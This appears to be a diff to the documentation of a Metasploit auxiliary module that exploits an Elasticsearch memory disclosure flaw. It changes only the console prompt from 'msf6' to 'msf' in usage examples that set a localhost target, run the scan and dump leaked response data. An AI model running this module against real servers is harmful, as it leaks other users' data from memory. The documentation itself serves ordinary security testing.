@@ -52,14 +52,14 @@ The module is run with action `SCAN`, and `leak_count` set to `2` to have a bett
 of leaking interesting information.
 
 ```
-msf6 > use auxiliary/scanner/http/elasticsearch_memory_disclosure
-msf6 auxiliary(scanner/http/elasticsearch_memory_disclosure) > set rhosts 127.0.0.1
+msf > use auxiliary/scanner/http/elasticsearch_memory_disclosure
+msf auxiliary(scanner/http/elasticsearch_memory_disclosure) > set rhosts 127.0.0.1
 rhosts => 127.0.0.1
-msf6 auxiliary(scanner/http/elasticsearch_memory_disclosure) > set verbose true
+msf auxiliary(scanner/http/elasticsearch_memory_disclosure) > set verbose true
 verbose => true
-msf6 auxiliary(scanner/http/elasticsearch_memory_disclosure) > set leak_count 2
+msf auxiliary(scanner/http/elasticsearch_memory_disclosure) > set leak_count 2
 leak_count => 2
-msf6 auxiliary(scanner/http/elasticsearch_memory_disclosure) > run
+msf auxiliary(scanner/http/elasticsearch_memory_disclosure) > run
 
 [*] Leaking response #1
 [*] Leaking response #2
@@ -73,9 +73,9 @@ HTTP/1.1 200 OK..rnal Server Error..1:9200..User-Agent: Mozilla/5.0 (Windows NT 
 In this example, we set the action to `DUMP` to store the data as well.
 
 ```
-msf6 auxiliary(scanner/http/elasticsearch_memory_disclosure) > set action dump
+msf auxiliary(scanner/http/elasticsearch_memory_disclosure) > set action dump
 action => dump
-msf6 auxiliary(scanner/http/elasticsearch_memory_disclosure) > run
+msf auxiliary(scanner/http/elasticsearch_memory_disclosure) > run
 
 [*] Leaking response #1
 [*] Leaking response #2
